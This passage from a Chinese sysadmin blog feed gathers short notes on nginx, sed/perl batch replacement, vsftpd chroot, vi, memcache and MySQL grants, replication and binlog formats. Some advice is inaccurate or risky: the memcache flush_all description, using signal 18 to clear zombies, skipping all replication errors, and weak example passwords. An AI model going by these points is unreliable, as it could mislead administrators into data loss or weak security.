<p>upstream server2 {<br>    server 10.0.0.1:80;<br>}<br>server {<br>    location /my_blog {<br>       error_page    404 = @try_server2;<br>    }<br>    location @try_server2 {<br>        proxy_pass <a href="http://server2" target="_blank" rel="external">http://server2</a>;<br>    }<br>这个功能可以用在Nginx前端+Apache后端的服务器架构中。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[sed复杂字符串替换使用案例记录]]></title>
      <url>/2012/07/23/sed-e5-a4-8d-e6-9d-82-e5-ad-97-e7-ac-a6-e4-b8-b2-e6-9b-bf-e6-8d-a2-e4-bd-bf-e7-94-a8-e6-a1-88-e4-be-8b-e8-ae-b0-e5-bd-95.html</url>
      <content type="html"><![CDATA[<p> sed    -i     ‘s#Powered by &lt;a href=”<a href="http://www.dedecms.com/" target="_blank" rel="external">http://www.dedecms.com</a>“ title=”织梦内容管理系统(DedeCms)–国内最专业的PHP网站管理系统，轻松建站的首选利器。” target=”_blank”&gt;&lt;strong&gt;DedeCMS_V57_UTF8_SP1&lt;/strong&gt;&lt;/a&gt; &amp;copy; 2004-2011 &lt;a href=”<a href="http://www.desdev.cn/" target="_blank" rel="external">http://www.desdev.cn/</a>“ target=”_blank”&gt;DesDev&lt;/a&gt; Inc.&lt;br /&gt;&lt;div&gt;Copyright &amp;copy; 2002-2011 DEDECMS. 织梦科技 版权所有&amp;nbsp;&amp;nbsp;&lt;/div&gt;&lt;/p&gt;#&lt;p&gt; 地址:广东省广州市黄埔区中山大道东金碧世纪花园  电话：020-28827254&lt;div&gt;Copyright &amp;copy; 20011-2012 &lt;/p&gt;#g’                <code>grep    &#39;Powered by &amp;lt;a href=&quot;[http://www.dedecms.com](http://www.dedecms.com/)&quot; title=&quot;织梦内容管理系统(DedeCms)--国内最专业的PHP网站管理系统，轻松建站的首选利器。&quot; target=&quot;_blank&quot;&amp;gt;&amp;lt;strong&amp;gt;DedeCMS_V57_UTF8_SP1&amp;lt;/strong&amp;gt;&amp;lt;/a&amp;gt; &amp;amp;copy; 2004-2011 &amp;lt;a href=&quot;[http://www.desdev.cn/](http://www.desdev.cn/)&quot; target=&quot;_blank&quot;&amp;gt;DesDev&amp;lt;/a&amp;gt; Inc.&amp;lt;br /&amp;gt;&amp;lt;div&amp;gt;Copyright &amp;amp;copy; 2002-2011 DEDECMS. 织梦科技 版权所有&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;/div&amp;gt;&amp;lt;/p&amp;gt;&#39;  . -R|awk -F : &#39;{print $1}&#39;</code></p>
<p>感谢v哥的帮助！@_@ 继续努力！分享每天的收获！</p>
]]></content>
      
        <categories>
            
            <category> 脚本开发 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[ftp禁止用户切换上级目录]]></title>
      <url>/2012/07/16/ftp-e7-a6-81-e6-ad-a2-e7-94-a8-e6-88-b7-e5-88-87-e6-8d-a2-e4-b8-8a-e7-ba-a7-e7-9b-ae-e5-bd-95.html</url>
      <content type="html"><![CDATA[<p>1、<br>chroot_list_enable=NO<br>chroot_local_user=YES—&gt;这样写 所有用户均不能切换到上级目录<br>2、<br>chroot_list_enable=NO<br>chroot_local_user=NO –&gt; 这样写所有用户都可以切换到上级目录</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[linux批量替换文件内容3种方法(perl,sed,shell)]]></title>
      <url>/2012/07/15/linux-e6-89-b9-e9-87-8f-e6-9b-bf-e6-8d-a2-e6-96-87-e4-bb-b6-e5-86-85-e5-ae-b93-e7-a7-8d-e6-96-b9-e6-b3-95perlsedshell.html</url>
      <content type="html"><![CDATA[<p>方法1： 这两天在构建一个应用的使用用到了maven,由于project很大,足足有700多个 pom.xml文件,更郁闷的是在很多pom.xml文件里都单独指定了资源库的url,我需要把这些资源库的url统一指定到nexus本地中央库.<br>手 工一个个改文件配置有点不太实际,所以google了一下,找到批量替换文件内容的好方法,命令结构如下:<br>find -name ‘要查找的文件名’ | xargs perl -pi -e ‘s|被替换的字符串|替换后的字符串|g’下面这个例子就是将当前目录及所有子目录下的所有pom.xml文件中的&#8221;<a href="http://repo1.maven.org/maven2&amp;#8220" target="_blank" rel="external">http://repo1.maven.org/maven2&amp;#8220</a>; 替换为&#8221;<a href="http://localhost:8081/nexus/content/groups/public&amp;#8220" target="_blank" rel="external">http://localhost:8081/nexus/content/groups/public&amp;#8220</a>;.<br>find -name ‘pom.xml’ | xargs perl -pi -e ‘s|<a href="http://repo1.maven.org/maven2|http://localhost:8081/nexus/content" target="_blank" rel="external">http://repo1.maven.org/maven2|http://localhost:8081/nexus/content</a> /groups/public|g’这里用到了Perl语言,<br>perl -pi -e 在Perl 命令中加上-e 选项，后跟一行代码，那它就会像运行一个普通的Perl 脚本那样运行该代码.<br>从命令行中使用Perl 能够帮助实现一些强大的、实时的转换。认真研究正则表达式，并正确地使用，将会为您省去大量的手工编辑工作。<br>find -name ‘pom.xml’ | xargs perl -pi -e ‘s|<a href="http://repo1.maven.org/maven2|http://localhost:8081/nexus/content/groups/public|g" target="_blank" rel="external">http://repo1.maven.org/maven2|http://localhost:8081/nexus/content/groups/public|g</a>‘ 方法2：<br>Linux下批量替换多个文件中的字符串的简单方法。用sed命令可以批量替换多个文件中的字符串。<br>用sed命令可以批量替换多个文件中的 字符串。<br>sed -i “s/原字符串/新字符串/g” <code>grep 原字符串 -rl 所在目录</code><br>例如：我要把mahuinan替换 为huinanma，执行命令：<br>sed -i “s/mahuinan/huinanma/g” ‘grep mahuinan -rl /www’<br>这是目前linux最简单的批量替换字符串命令了！<br>具体格式如下：<br>sed -i “s/oldString/newString/g”  <code>grep oldString -rl /path</code><br>实例代码：sed -i “s/大小多少/日月水火/g” <code>grep 大小多少 -rl /usr/aa</code><br>sed -i “s/大小多少/日月水火/g” <code>grep 大小多少 -rl ./</code></p>
<p>方法3：</p>
<p>在日程的开发过程中，可能大家会遇到将某个变量名修改 为另一个变量名的情况，如果这个变量是一个局部变量的话，vi足以胜任，但是如果是某个全局变量的话，并且在很多文件中进行了使用，这个时候使用vi就是 一个不明智的选择。这里给出一个简单的shell命令，可以一次性将所有文件中的指定字符串进行修改：</p>
<p>grep “abc” * -R | awk -F: ‘{print $1}’ | sort | uniq | xargs sed -i ‘s/abc/abcde/g’</p>
<p>批量替换 配置文件中的IP：</p>
<p>grep “[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}” * -R | awk -F: ‘{print $1}’ |  sort | uniq | xargs sed -i ‘s/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/172.0.0.1/g’  </p>
<p>补充说明：<br>sed -i “s/oldString/newString/g”  <code>grep oldString -rl /path</code><br>对多个文件的处理可能不支持，需要用 xargs, 搞定。<br>变种如下：<br>grep  oldString   -rl  /path | xargs  sed -i “s/oldString/newString/g”</p>
<p>对 grep 文件的更多操作：</p>
<p>grep -rl  “oldString” . –include=*.{h,cpp}  |  while read file; do  echo $file;done</p>
<p>注意：<br>在  <code>grep oldString -rl /path</code>   中 <code>为1前边的翻引号</code>，而不是enter 前的 ‘</p>
]]></content>
      
        <categories>
            
            <category> 脚本开发 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[vi编辑替换字符笔记]]></title>
      <url>/2012/07/13/vi-e7-bc-96-e8-be-91-e6-9b-bf-e6-8d-a2-e5-ad-97-e7-ac-a6-e7-ac-94-e8-ae-b0.html</url>
      <content type="html"><![CDATA[<p>vi/vim 中可以使用 :s 命令来替换字符串。</p>
<p>　　:s/vivian/sky/ 替换当前行第一个 vivian 为 sky</p>
<p>　　:s/vivian/sky/g 替换当前行所有 vivian 为 sky</p>
<p>　　:n,$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky</p>
<p>　　:n,$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky</p>
<p>　　n 为数字，若 n 为 .，表示从当前行开始到最后一行</p>
<p>　　:%s/vivian/sky/(等同于 :g/vivian/s//sky/) 替换每一行的第一个 vivian 为 sky</p>
<p>　　:%s/vivian/sky/g(等同于 :g/vivian/s//sky/g) 替换每一行中所有 vivian 为 sky</p>
<p>　　可以使用 # 作为分隔符，此时中间出现的 / 不会作为分隔符</p>
<p>　　:s#vivian/#sky/# 替换当前行第一个 vivian/ 为 sky/</p>
<p>　　:%s+/oradata/apras/+/user01/apras1+ (使用+ 来 替换 / )： /oradata/apras/替换成/user01/apras1/</p>
<p>　　<em> <strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></em></p>
<p>　　1.:s/vivian/sky/ 替换当前行第一个 vivian 为 sky</p>
<p>　　:s/vivian/sky/g 替换当前行所有 vivian 为 sky</p>
<p>　　2. :n,$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky</p>
<p>　　:n,$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky</p>
<p>　　(n 为数字，若 n 为 .，表示从当前行开始到最后一行)</p>
<p>　　3. :%s/vivian/sky/(等同于 :g/vivian/s//sky/) 替换每一行的第一个 vivian 为 sky</p>
<p>　　:%s/vivian/sky/g(等同于 :g/vivian/s//sky/g) 替换每一行中所有 vivian 为 sky</p>
<p>　　4. 可以使用 # 作为分隔符，此时中间出现的 / 不会作为分隔符</p>
<p>　　:s#vivian/#sky/# 替换当前行第一个 vivian/ 为 sky/</p>
<p>　　5. 删除文本中的^M</p>
<p>　　问题描述：对于换行,window下用回车换行(0A0D)来表示，<a href="http://net.zdnet.com.cn/files/list-0-0-102937-1-1.htm" target="_blank" rel="external">Linux</a>下是回车(0A)来表示。这样，将window上的文件拷到unix上用时，总会有个^M.请写个用在unix下的过滤windows文件的换行符(0D)的shell或c程序。</p>
<p>　　· 使用命令：cat filename1 | tr -d “^V^M” &gt;newfile;</p>
<p>　　· 使用命令：sed -e “s/^V^M//” filename &gt;outputfilename。需要注意的是在1、2两种方法中，^V和^M指的是Ctrl+V和Ctrl+M。你必须要手工进行输入，而不是粘贴。</p>
<p>　　· 在vi中处理：首先使用vi打开文件，然后按ESC键，接着输入命令：%s/^V^M//。</p>
<p>　　· :%s/^M$//g</p>
<p>　　如果上述方法无用，则正确的解决办法是：</p>
<p>　　· tr -d “r” &lt;src &gt;dest</p>
<p>　　· tr -d “5” dest</p>
<p>　　· strings A&gt;B</p>
<p>　　6. 其它</p>
<p>　　利用 :s 命令可以实现字符串的替换。具体的用法包括：</p>
<p>　　:s/str1/str2/ 用字符串 str2 替换行中首次出现的字符串 str1</p>
<p>　　:s/str1/str2/g 用字符串 str2 替换行中所有出现的字符串 str1</p>
<p>　　:.,$ s/str1/str2/g 用字符串 str2 替换正文当前行到末尾所有出现的字符串 str1</p>
<p>　　:1,$ s/str1/str2/g 用字符串 str2 替换正文中所有出现的字符串 str1</p>
<p>　　:g/str1/s//str2/g 功能同上</p>
<p>　　从上述替换命令可以看到：g 放在命令末尾，表示对搜索字符串的每次出现进行替换;不加 g，表示只对搜索</p>
<p>　　字符串的首次出现进行替换;g 放在命令开头，表示对正文中所有包含搜索字符串的行进行替换操作。</p>
]]></content>
      
        <categories>
            
            <category> 脚本开发 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql查看所有存储过程查询]]></title>
      <url>/2012/07/13/mysql-e6-9f-a5-e7-9c-8b-e6-89-80-e6-9c-89-e5-ad-98-e5-82-a8-e8-bf-87-e7-a8-8b-e6-9f-a5-e8-af-a2.html</url>
      <content type="html"><![CDATA[<p><pre><span style="color: #000000;">查询数据库中的存储过程</span></pre></p>
<p><pre><span style="color: #000000;">方法一：</span></pre></p>
<p><pre><span style="color: #000000;">select <code>name</code> from mysql.proc where db = ‘your_db_name’ and <code>type</code> = ‘PROCEDURE’</span></pre><br>方法二：</p>
<p>show procedure status;</p>
<p>查看存储过程或函数的创建代码</p>
<p>show create procedure proc_name;<br>show create function func_name;</p>
<p>方法三：使用Navicat客户端工具</p>
<p>查看在某个库下创建的存储过程，就去查看函数选项即可，支持编辑修改！</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux下杀僵尸进程办法]]></title>
      <url>/2012/07/12/linux-e4-b8-8b-e6-9d-80-e5-83-b5-e5-b0-b8-e8-bf-9b-e7-a8-8b-e5-8a-9e-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p>　1) 检查当前僵尸进程信息</p>
<p>　　# ps -ef | grep defunct | grep -v grep | wc -l</p>
<p>　　175</p>
<p>　　# top | head -2</p>
<p>　　top - 15:05:54 up 97 days, 23:49,  4 users,  load average: 0.66, 0.45, 0.39</p>
<p>　　Tasks: 829 total,   1 running, 479 sleeping, 174 stopped, 175 zombie</p>
<p>　　# ps -ef | grep defunct | grep -v grep</p>
<p>　　2) 获得杀僵尸进程语句</p>
<p>　　# ps -ef | grep defunct | grep -v grep | awk ‘{print “kill -9 “ $2,$3}’</p>
<p>　　执行上面获得的语句即可, 使用信号量9, 僵尸进程数会大大减少.</p>
<p>　　3) 过一会儿检查当前僵尸进程信息</p>
<p>　　# ps -ef | grep defunct | grep -v grep | wc -l</p>
<p>　　125</p>
<p>　　# top | head -2</p>
<p>　　top - 15:29:26 up 98 days, 12 min,  7 users,  load average: 0.27, 0.54, 0.56</p>
<p>　　Tasks: 632 total,   1 running, 381 sleeping, 125 stopped, 125 zombie</p>
<p>　　发现僵尸进程数减少了一些, 但还有不少啊.</p>
<p>　　4) 再次获得杀僵尸进程语句</p>
<p>　　# ps -ef | grep defunct | grep -v grep | awk ‘{print “kill -18 “ $3}’</p>
<p>　　执行上面获得的语句即可, 这次使用信号量18杀其父进程, 僵尸进程应该会全部消失.</p>
<p>　　5) 过一会儿再检查当前僵尸进程信息</p>
<p>　　# ps -ef | grep defunct | grep -v grep | wc -l</p>
<p>　　0</p>
<p>　　# top | head -2</p>
<p>　　top - 15:39:46 up 98 days, 23 min,  7 users,  load average: 5.46, 2.20, 1.12</p>
<p>　　Tasks: 134 total,   1 running, 133 sleeping,   0 stopped,   0 zombie</p>
<p>　　6) 清除ZOMBIE(僵尸)进程原理</p>
<p>　　# kill -18 PPID</p>
<p>　　PPID是其父进程, 这个信号是告诉父进程, 该子进程已经死亡了, 请收回分配给他的资源. 如果还不行则看先看其父进程又无其他子进程, 如果有, 可能需要先kill其他子进程, 也就是兄弟进程.</p>
<p>　　方法是:</p>
<p>　　# kill -15 PID1 PID2</p>
<p>　　PID1,PID2是僵尸进程的父进程的其它子进程.</p>
<p>　　然后再kill父进程:</p>
<p>　　# kill -15 PPID</p>
<p>　　–End–</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql slave不能同步Error 'Duplicate entry '1438019' for key 'PRIMARY'' on query]]></title>
      <url>/2012/07/09/mysql-slave-e4-b8-8d-e8-83-bd-e5-90-8c-e6-ad-a5error-duplicate-entry-1438019-for-key-primary-on-query.html</url>
      <content type="html"><![CDATA[<p>mysql&gt; show slave statusG;<br><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong> 1. row <strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong><br>               Slave_IO_State: Waiting for master to send event<br>                  Master_Host: 192.168.10.100<br>                  Master_User: slave_user<br>                  Master_Port: 3306<br>                  Connect_Retry: 60<br>                  Master_Log_File: mysql-bin.000773<br>                  Read_Master_Log_Pos: 63325<br>                  Relay_Log_File: server122-relay-bin.000002<br>                  Relay_Log_Pos: 165661<br>                  Relay_Master_Log_File: mysql-bin.000771<br>                  Slave_IO_Running: Yes<br>                  Slave_SQL_Running: No<br>                  Replicate_Do_DB:<br>                  Replicate_Ignore_DB:<br>                  Replicate_Do_Table:<br>                  Replicate_Ignore_Table:<br>                  Replicate_Wild_Do_Table:<br>                  Replicate_Wild_Ignore_Table:<br>                   Last_Errno: 1062<br>                   Last_Error: Error ‘Duplicate entry ‘1438019’ for key ‘PRIMARY’’ on query. Default database: ‘otrs’. Query: ‘INSERT INTO ticket (tn, title, create_time_unix, queue_id, ticket_lock_id,  user_id, group_id, ticket_priority_id, ticket_state_id, ticket_answered,  escalation_start_time, timeout, valid_id, create_time, create_by, change_time, change_by)  VALUES (‘2012061310001851’, ‘Your order  ORD201205A000016 was bounced back’, 1339585744, 44, 1, 43,  1, 3, 4,  0, 1339585744, 0, 1,  current_timestamp, 43, current_timestamp, 43)’<br>                 Skip_Counter: 0<br>                 Exec_Master_Log_Pos: 41969067<br>                 Relay_Log_Space: 625695<br>                 Until_Condition: None<br>                 Until_Log_File:<br>                 Until_Log_Pos: 0<br>                 Master_SSL_Allowed: No<br>                 Master_SSL_CA_File:<br>                 Master_SSL_CA_Path:<br>                 Master_SSL_Cert:<br>                 Master_SSL_Cipher:<br>                 Master_SSL_Key:<br>                 Seconds_Behind_Master: NULL<br>                 Master_SSL_Verify_Server_Cert: No<br>                Last_IO_Errno: 0<br>                Last_IO_Error:<br>                Last_SQL_Errno: 1062<br>                Last_SQL_Error: Error ‘Duplicate entry ‘1438019’ for key ‘PRIMARY’’ on query. Default database: ‘otrs’. Query: ‘INSERT INTO ticket (tn, title, create_time_unix, queue_id, ticket_lock_id,  user_id, group_id, ticket_priority_id, ticket_state_id, ticket_answered,  escalation_start_time, timeout, valid_id, create_time, create_by, change_time, change_by)  VALUES (‘2012061310001851’, ‘Your order  ORD201205A000016 was bounced back’, 1339585744, 44, 1, 43,  1, 3, 4,  0, 1339585744, 0, 1,  current_timestamp, 43, current_timestamp, 43)’<br>1 row in set (0.00 sec)</p>
<p>分析原因：重复插入相同的记录，造成的主键冲突问题</p>
<p>解决方法：<br>一、如果较少的错误可以手动解决</p>
<p>slave stop;<br>set global sql_slave_skip_counter=n; \ n=正整数，，看你的错误有几条，就跳过几条<br>slave start;</p>
<p>二、较多的情况下增加slave_skip_errors = 1062 参数</p>
<p>my.cnf 中增加slave_skip_errors = 1062 参数，忽略1062错误，若忽略多个错误，中间用逗号隔开，忽略所有用all</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[memcache清除items和expired方法]]></title>
      <url>/2012/07/07/memcache-e6-b8-85-e9-99-a4items-e5-92-8cexpired-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p>1.第一种方法：只能清除处于expired状态的缓存：echo “flush_all”|nc localhost 11211</p>
<p>2.第二种方法：清除所有数据缓存：</p>
<p>&nbsp;</p>
<div><br><div><span style="color: #ff0000;"><span style="color: #ff0000;"><code>&amp;lt;?php</code></span></span>/<em> procedural API </em>/<br>$memcache_obj = memcache_connect(‘memcache_host’, 11211);<br><br>memcache_flush($memcache_obj);<br><br>/<em> OO API </em>/<br><br>$memcache_obj = new Memcache;<br>$memcache_obj-&gt;connect(‘memcache_host’, 11211);<br><br>$memcache_obj-&gt;flush();<br><br>?&gt;<br><br></div><br></div>]]></content>
      
        <categories>
            
            <category> NoSQL </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql授权和回收]]></title>
      <url>/2012/07/07/mysql-e6-8e-88-e6-9d-83-e5-92-8c-e5-9b-9e-e6-94-b6.html</url>
      <content type="html"><![CDATA[<p>mysql跟其他数据库一样可以为不同的用户分配不同的权限<br>基本的操作使用的是SQL中的Grant(分配权限)和Revoke(回收权限)</p>
<p>一、关于Grant<br>Grant可以把指定的权限分配给特定的用户，如果这个用户不存在，则会创建一个用户</p>
<p><a href="http://www.linuxso.com/command/" target="_blank" rel="external"><span style="text-decoration: underline;">命令</span></a>格式<br>grant 权限 on 数据库名.表名 to 用户名@登陆方式 <a href="http://www.linuxso.com/command/id.html" target="_blank" rel="external"><span style="text-decoration: underline;">id</span></a>entified by ‘password1’;</p>
<p>grant select,insert,up<a href="http://www.linuxso.com/command/date.html" target="_blank" rel="external"><span style="text-decoration: underline;">date</span></a>,delete on auth.<em> to user1@localhost identified by ‘password’;<br>权    限:select,insert,update,delete,drop,ind<a href="http://www.linuxso.com/command/ex.html" target="_blank" rel="external"><span style="text-decoration: underline;">ex</span></a>,all,privileges(表示赋予用户全部权限跟all一样)<br>数据库  :当数据库名称.表名称被</em>.*代替，表示用户拥有操作mysql上所有数据库所有表的权限<br>登陆方式:即用户地址,可以是localhost，也可以是ip地址、机器名字、域名.也可以用’%’表示从任何地址连接<br>‘password’：可以为空，但是为空这表示只能从本地登陆，建议不能为空</p>
<p>范例1：<br>授权数据库用户tom从本机访问MySQL服务器并拥有对auth数据库中所有表的完全权限</p>
<p>mysql&gt; grant all on auth.* TO tom@localhost identified by ‘123’;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; grant all on auth.* TO tom@’localhost’ identified by “123”;</p>
<p>小结：使用引号或双引号没有任何区别，主要是用于区别字符和命令</p>
<p>范例2：<br>授权数据库用户john从10.0.0.0/8 网络中连接到MySQL服务器,对auth数据库中所有表拥有完全权限<br>mysql&gt; grant all on auth.* to john@’10.0.0.0/8’ identified by ‘123’;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; grant all on auth.* TO tom@192.168.1.1 identified by ‘123’;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>mysql&gt; grant all privileges on <em>.</em> to 123ks@localhost identified by ‘123456’;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>小结：如果是指定了一个网段或网络范围的话，网段或网络范围需要加引号</p>
<p>二、关于Revoke<br>revoke的作用则是回收授于用户的权限<br>命令格式为：<br>revoke 权限 on 数据库名.表名 from 用户名@登陆方式；</p>
<p>范例3：<br>撤销用户tom从本机访问数据库auth的所有权限<br>mysql&gt; revoke all on auth.<em> from tom@’localhost’;<br>Query OK, 0 rows affected (0.00 sec)<br>tom@</em>:*即登陆方式，有时候可能撤销的不是本地用户，要根据需要撤销</p>
<p>范例4：<br>撤销用户tom从任意地址访问数据库auth的所有权限<br>mysql&gt; revoke all on auth.* from tom@’%’;<br>Query OK, 0 rows affected (0.00 sec)</p>
<p>范例5：<br>查看tom用户从本机连接是的权限<br>mysql&gt; show grants for tom@localhost;</p>
<p>范例6：<br>查看数据库auth中所有授权的用户<br>mysql&gt; select host,user,db from mysql.db where db=’auth’; 这里没有使用use mysql 效果是跨库查表</p>
<p>范例7：<br>查看当前登陆用户的权限<br>mysql&gt; show grants;</p>
<p>范例8：<br>删除用户123cs@localhost<br>delete from mysql.user where user=’123cs’;<br>删除用户后使用show grant 查看该用户会发现能看到此用户的权限，那是因为并没有撤销他的权限<br>在MySQL中，用户信息存放在mysql.User中。</p>
<p>灵活使用权限赋予和撤销，可以加深对SQL中的权限参数的理解，初学者不放试着多多练习，有助于在SQL上的理解</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL binlog_format (Mixed,Statement,Row)区别和使用场合]]></title>
      <url>/2012/07/06/mysql-binlog-format-mixedstatementrow-e5-8c-ba-e5-88-ab-e5-92-8c-e4-bd-bf-e7-94-a8-e5-9c-ba-e5-90-88.html</url>
      <content type="html"><![CDATA[<p>MySQL 5.5 中对于二进制日志 (binlog) 有 3 种不同的格式可选：Mixed,Statement,Row，默认格式是 Statement。总结一下这三种格式日志的优缺点。</p>
<p>MySQL Replication 复制可以是基于一条语句 (Statement Level) ，也可以是基于一条记录 (Row Level)，可以在 MySQL 的配置参数中设定这个复制级别，不同复制级别的设置会影响到 Master 端的 bin-log 日志格式。</p>
<p><strong>1. Row</strong><br>日志中会记录成每一行数据被修改的形式，然后在 slave 端再对相同的数据进行修改。</p>
<p><strong>优点</strong>：在 row 模式下，bin-log 中可以不记录执行的 SQL 语句的上下文相关的信息，仅仅只需要记录那一条记录被修改了，修改成什么样了。所以 row 的日志内容会非常清楚的记录下每一行数据修改的细节，非常容易理解。而且不会出现某些特定情况下的存储过程或 function ，以及 trigger 的调用和触发无法被正确复制的问题。</p>
<p><strong>缺点</strong>：在 row 模式下，所有的执行的语句当记录到日志中的时候，都将以每行记录的修改来记录，这样可能会产生大量的日志内容，比如有这样一条 update 语句：</p>
<p><div></div></p>
<p><pre>UPDATE product SET owner_member_id = ‘b’ WHERE owner_member_id = ‘a’</pre><br> <br>执行之后，日志中记录的不是这条 update 语句所对应的事件 (MySQL 以事件的形式来记录 bin-log 日志) ，而是这条语句所更新的每一条记录的变化情况，这样就记录成很多条记录被更新的很多个事件。自然，bin-log 日志的量就会很大。尤其是当执行 alter table 之类的语句的时候，产生的日志量是惊人的。因为 MySQL 对于 alter table 之类的表结构变更语句的处理方式是整个表的每一条记录都需要变动，实际上就是重建了整个表。那么该表的每一条记录都会被记录到日志中。</p>
<p><strong>2. Statement</strong><br>每一条会修改数据的 SQL 都会记录到 master 的 bin-log 中。slave 在复制的时候 SQL 进程会解析成和原来 master 端执行过的相同的 SQL 再次执行。</p>
<p><strong>优点</strong>：在 statement 模式下，首先就是解决了 row 模式的缺点，不需要记录每一行数据的变化，减少了 bin-log 日志量，节省 I/O 以及存储资源，提高性能。因为他只需要记录在 master 上所执行的语句的细节，以及执行语句时候的上下文的信息。</p>
<p><strong>缺点</strong>：在 statement 模式下，由于他是记录的执行语句，所以，为了让这些语句在 slave 端也能正确执行，那么他还必须记录每条语句在执行的时候的一些相关信息，也就是上下文信息，以保证所有语句在 slave 端杯执行的时候能够得到和在 master 端执行时候相同的结果。另外就是，由于 MySQL 现在发展比较快，很多的新功能不断的加入，使 MySQL 的复制遇到了不小的挑战，自然复制的时候涉及到越复杂的内容，bug 也就越容易出现。在 statement 中，目前已经发现的就有不少情况会造成 MySQL 的复制出现问题，主要是修改数据的时候使用了某些特定的函数或者功能的时候会出现，比如：sleep() 函数在有些版本中就不能被正确复制，在存储过程中使用了 last_insert_id() 函数，可能会使 slave 和 master 上得到不一致的 id 等等。由于 row 是基于每一行来记录的变化，所以不会出现类似的问题。</p>
<p><strong>3. Mixed</strong><br>从官方文档中看到，之前的 MySQL 一直都只有基于 statement 的复制模式，直到 5.1.5 版本的 MySQL 才开始支持 row 复制。从 5.0 开始，MySQL 的复制已经解决了大量老版本中出现的无法正确复制的问题。但是由于存储过程的出现，给 MySQL Replication 又带来了更大的新挑战。另外，看到官方文档说，从 5.1.8 版本开始，MySQL 提供了除 Statement 和 Row 之外的第三种复制模式：Mixed，实际上就是前两种模式的结合。在 Mixed 模式下，MySQL 会根据执行的每一条具体的 SQL 语句来区分对待记录的日志形式，也就是在 statement 和 row 之间选择一种。新版本中的 statment 还是和以前一样，仅仅记录执行的语句。而新版本的 MySQL 中对 row 模式也被做了优化，并不是所有的修改都会以 row 模式来记录，比如遇到表结构变更的时候就会以 statement 模式来记录，如果 SQL 语句确实就是 update 或者 delete 等修改数据的语句，那么还是会记录所有行的变更。</p>
<p><strong>其他参考信息</strong></p>
<p><strong>除以下几种情况外，在运行时可以动态改变 binlog 的格式</strong>：<br>. 存储流程或者触发器中间；<br>. 启用了 NDB；<br>. 当前会话使用 row 模式，并且已打开了临时表；</p>
<p><strong>如果 binlog 采用了 Mixed 模式，那么在以下几种情况下会自动将 binlog 的模式由 statement 模式变为 row 模式</strong>：<br>. 当 DML 语句更新一个 NDB 表时；<br>. 当函数中包含 UUID() 时；<br>. 2 个及以上包含 AUTO_INCREMENT 字段的表被更新时；<br>. 执行 INSERT DELAYED 语句时；<br>. 用 UDF 时；<br>. 视图中必须要求运用 row 时，例如建立视图时使用了 UUID() 函数；</p>
<p><strong>设定主从复制模式</strong>：</p>
<p><div></div></p>
<p><table style="width: 395px; height: 100px;"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td></td></p>
<p><pre>log-bin=mysql-bin</pre></p>
<p>#binlog_format=”STATEMENT”</p>
<p>#binlog_format=”ROW”<br>binlog_format=”MIXED”<br><br><br><br><br><br><strong>也可以在运行时动态修改 binlog 的格式。例如</strong>：</p>
<p><div></div></p>
<p><table style="width: 552px; height: 136px;"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td></td></p>
<p><pre>1<br>2<br>3<br>4<br>5<br>6</pre><br></p>
<p><td></td></p>
<p><pre>mysql&gt; SET SESSION binlog_format = ‘STATEMENT’;<br>mysql&gt; SET SESSION binlog_format = ‘ROW’;<br>mysql&gt; SET SESSION binlog_format = ‘MIXED’;<br>mysql&gt; SET GLOBAL binlog_format = ‘STATEMENT’;<br>mysql&gt; SET GLOBAL binlog_format = ‘ROW’;<br>mysql&gt; SET GLOBAL binlog_format = ‘MIXED’;</pre><br><br><br><br><br><br><strong>两种模式的对比</strong>：<br><strong>Statement 优点</strong><br>历史悠久，技术成熟；<br>产生的 binlog 文件较小；<br>binlog 中包含了所有数据库修改信息，可以据此来审核数据库的安全等情况；<br>binlog 可以用于实时的还原，而不仅仅用于复制；<br>主从版本可以不一样，从服务器版本可以比主服务器版本高；</p>
<p><strong>Statement 缺点</strong>：<br>不是所有的 UPDATE 语句都能被复制，尤其是包含不确定操作的时候；<br>调用具有不确定因素的 UDF 时复制也可能出现问题；<br>运用以下函数的语句也不能被复制：</p>
<ul>
<li>LOAD_FILE()</li>
<li>UUID()</li>
<li>USER()</li>
<li>FOUND_ROWS()</li>
